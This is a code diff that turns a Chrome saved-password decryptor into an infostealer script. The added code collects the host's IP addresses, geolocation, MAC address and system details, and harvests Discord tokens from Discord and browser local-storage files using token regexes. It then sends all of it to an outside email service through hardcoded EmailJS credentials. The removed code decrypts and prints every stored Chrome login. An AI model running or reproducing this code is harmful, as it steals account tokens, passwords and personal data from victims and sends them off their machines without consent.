@@ -1,133 +1,184 @@
-import os
+import psutil
+import platform
 import json
+from datetime import datetime
+from time import sleep
+import requests
+import socket
+import os
+import re
+from uuid import getnode as get_mac
 import base64
 import sqlite3
 import shutil
-from datetime import datetime
-import win32crypt
-from Crypto.Cipher import AES
+import sys
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
-def get_chrome_master_key():
-    """Retrieve and decrypt the AES master key from Chrome's 'Local State'."""
-    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
-    print(f"[INFO] Reading Local State from: {local_state_path}")
+import requests
 
-    with open(local_state_path, 'r', encoding='utf-8') as f:
-        local_state = json.load(f)
+# EmailJS info
+EMAILJS_SERVICE_ID = "service_6zq8q4c"
+EMAILJS_TEMPLATE_ID = "template_pykx593"
+EMAILJS_USER_ID = "E_aFnjODCeH7iOf5d"
 
-    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
-    encrypted_key = base64.b64decode(encrypted_key_b64)
-    # Remove DPAPI prefix "DPAPI" (5 bytes)
-    encrypted_key = encrypted_key[5:]
-    print(f"[DEBUG] Encrypted AES key (hex): {encrypted_key.hex()}")
-
-    # Decrypt AES key using Windows DPAPI
-    try:
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        print(f"[DEBUG] AES master key (hex): {master_key.hex()}")
-        return master_key
-    except Exception as e:
-        print(f"[ERROR] Failed to decrypt AES master key: {e}")
-        raise
-
-def decrypt_password(ciphertext: bytes, master_key: bytes):
-    """Decrypt Chrome password given ciphertext and master key."""
-    print(f"[DEBUG] Encrypted blob (hex): {ciphertext.hex()}")
-
-    if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v20'):
-        prefix = ciphertext[:3]
-        print(f"[DEBUG] Prefix: {prefix.decode()} (AES-GCM encrypted)")
-        try:
-            # AES-GCM payload format:
-            # prefix(3) + nonce(12) + ciphertext + tag(16)
-            nonce = ciphertext[3:15]
-            encrypted_pass = ciphertext[15:-16]
-            tag = ciphertext[-16:]
-            print(f"[DEBUG] Nonce (hex): {nonce.hex()}")
-            print(f"[DEBUG] Encrypted data (hex): {encrypted_pass.hex()}")
-            print(f"[DEBUG] Tag (hex): {tag.hex()}")
-
-            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-            decrypted_pass = cipher.decrypt_and_verify(encrypted_pass, tag)
-            password = decrypted_pass.decode()
-            print(f"[DEBUG] Decrypted password: {password}")
-            return password
-        except Exception as e:
-            print(f"[ERROR] AES-GCM decryption failed: {e}")
-            return "<decryption failed>"
+def send_emailjs_message(message):
+    url = 'https://api.emailjs.com/api/v1.0/email/send'
+    payload = {
+        "service_id": EMAILJS_SERVICE_ID,
+        "template_id": EMAILJS_TEMPLATE_ID,
+        "user_id": EMAILJS_USER_ID,
+        "template_params": {
+            "from_name": "Data Collector Bot",
+            "to_name": "Your Name",
+            "message": message,
+            "reply_to": "your-email@example.com"  # change to your real email
+        }
+    }
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(url, json=payload, headers=headers)
+    if response.status_code == 200:
+        print("Email sent successfully!")
     else:
-        # Fallback to legacy Windows DPAPI decryption
-        print(f"[DEBUG] Trying legacy DPAPI decryption.")
+        print("Failed to send email:", response.text)
+
+def scale(bytes, suffix="B"):
+    defined = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < defined:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= defined
+
+uname = platform.uname()
+bt = datetime.fromtimestamp(psutil.boot_time())
+host = socket.gethostname()
+localip = socket.gethostbyname(host)
+publicip = requests.get('https://api.ipify.org').text
+city = requests.get(f'https://ipapi.co/{publicip}/city').text
+region = requests.get(f'https://ipapi.co/{publicip}/region').text
+postal = requests.get(f'https://ipapi.co/{publicip}/postal').text
+timezone = requests.get(f'https://ipapi.co/{publicip}/timezone').text
+currency = requests.get(f'https://ipapi.co/{publicip}/currency').text
+country = requests.get(f'https://ipapi.co/{publicip}/country_name').text
+callcode = requests.get(f"https://ipapi.co/{publicip}/country_calling_code").text
+vpn = requests.get('http://ip-api.com/json?fields=proxy')
+proxy = vpn.json()['proxy']
+mac = get_mac()
+
+roaming = os.getenv('APPDATA')
+
+# Discord & browser directories to search tokens
+Directories = {
+    'Discord': roaming + '\\Discord',
+    'Discord Two': roaming + '\\discord',
+    'Discord Canary': roaming + '\\Discordcanary',
+    'Discord Canary Two': roaming + '\\discordcanary',
+    'Discord PTB': roaming + '\\discordptb',
+    'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
+    'Opera': roaming + '\\Opera Software\\Opera Stable',
+    'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
+}
+
+def Yoink(Directory):
+    Directory += '\\Local Storage\\leveldb'
+    Tokens = []
+    if not os.path.exists(Directory):
+        return Tokens
+    for FileName in os.listdir(Directory):
+        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
+            continue
         try:
-            decrypted_pass = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
-            if decrypted_pass:
-                password = decrypted_pass.decode()
-                print(f"[DEBUG] DPAPI decrypted password: {password}")
-                return password
-            else:
-                print("[WARN] DPAPI returned empty password.")
-                return "<empty password>"
-        except Exception as e:
-            print(f"[ERROR] DPAPI decryption failed: {e}")
-            return "<decryption failed>"
+            with open(f'{Directory}\\{FileName}', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        Tokens.extend(re.findall(regex, line))
+        except:
+            continue
+    return Tokens
 
-def main():
-    # Path to Chrome Login Data SQLite database
-    login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
+# Collect tokens from directories
+all_tokens = []
+for name, path in Directories.items():
+    if os.path.exists(path):
+        tokens = Yoink(path)
+        all_tokens.extend(tokens)
 
-    # Create a temporary copy to avoid locks
-    tmp_db = "LoginDataTemp.db"
-    shutil.copy2(login_data_path, tmp_db)
+# Gather system info
+cpufreq = psutil.cpu_freq()
+svmem = psutil.virtual_memory()
+disk_io = psutil.disk_io_counters()
+net_io = psutil.net_io_counters()
 
-    master_key = get_chrome_master_key()
-
-    conn = sqlite3.connect(tmp_db)
-    cursor = conn.cursor()
-
-    cursor.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins')
-
-    for row in cursor.fetchall():
-        origin_url, action_url, username, encrypted_password_blob, date_created, date_last_used = row
-
-        print("="*60)
-        print(f"Origin URL   : {origin_url}")
-        print(f"Action URL   : {action_url}")
-        print(f"Username     : {username}")
-
-        if encrypted_password_blob:
-            password = decrypt_password(encrypted_password_blob, master_key)
-        else:
-            password = "<empty blob>"
-
-        print(f"Password     : {password}")
-        print(f"Encrypted Hex: {encrypted_password_blob.hex() if encrypted_password_blob else ''}")
-
-        # Chrome timestamps are microseconds since 1601-01-01 UTC
-        def chrome_time_to_datetime(chrome_time):
-            if chrome_time:
-                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
-            return None
-
-        # date_created and date_last_used may be None or 0
+try:
+    partitions = psutil.disk_partitions()
+    partition_usage = None
+    for partition in partitions:
         try:
-            created_dt = chrome_time_to_datetime(date_created)
-        except Exception:
-            created_dt = None
+            partition_usage = psutil.disk_usage(partition.mountpoint)
+            break  # just take the first usable partition for info
+        except PermissionError:
+            continue
+except:
+    partition_usage = None
 
-        try:
-            last_used_dt = chrome_time_to_datetime(date_last_used)
-        except Exception:
-            last_used_dt = None
+# Format collected data into a string
+collected_info = f"""
+Host: {host}
+Local IP: {localip}
+Public IP: {publicip}
+MAC: {mac}
+VPN Proxy: {proxy}
 
-        print(f"Created      : {created_dt}")
-        print(f"Last Used    : {last_used_dt}")
+Location:
+Country: {country}
+Region: {region}
+City: {city}
+Postal Code: {postal}
+Timezone: {timezone}
+Currency: {currency}
+Calling Code: {callcode}
 
-    cursor.close()
-    conn.close()
+System:
+System: {uname.system}
+Node Name: {uname.node}
+Release: {uname.release}
+Version: {uname.version}
+Machine: {uname.machine}
+Processor: {uname.processor}
+Boot Time: {bt}
 
-    # Remove temp DB copy
-    os.remove(tmp_db)
+CPU:
+Physical cores: {psutil.cpu_count(logical=False)}
+Total cores: {psutil.cpu_count(logical=True)}
+Max Frequency: {cpufreq.max:.2f}Mhz
+Min Frequency: {cpufreq.min:.2f}Mhz
+Current Frequency: {cpufreq.current:.2f}Mhz
+CPU Usage: {psutil.cpu_percent()}%
 
-if __name__ == '__main__':
-    from datetime import timedelta
-    main()
+Memory:
+Total: {scale(svmem.total)}
+Available: {scale(svmem.available)}
+Used: {scale(svmem.used)}
+Percentage: {svmem.percent}%
+
+Disk:
+""" + (f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%" if partition_usage else "No disk usage info") + f"""
+
+Disk I/O:
+Read bytes: {scale(disk_io.read_bytes)}
+Write bytes: {scale(disk_io.write_bytes)}
+
+Network:
+Bytes Sent: {scale(net_io.bytes_sent)}
+Bytes Received: {scale(net_io.bytes_recv)}
+
+Discord Tokens found:
+{', '.join(all_tokens) if all_tokens else "No tokens found"}
+"""
+
+# Send collected info via EmailJS
+send_emailjs_message(collected_info)
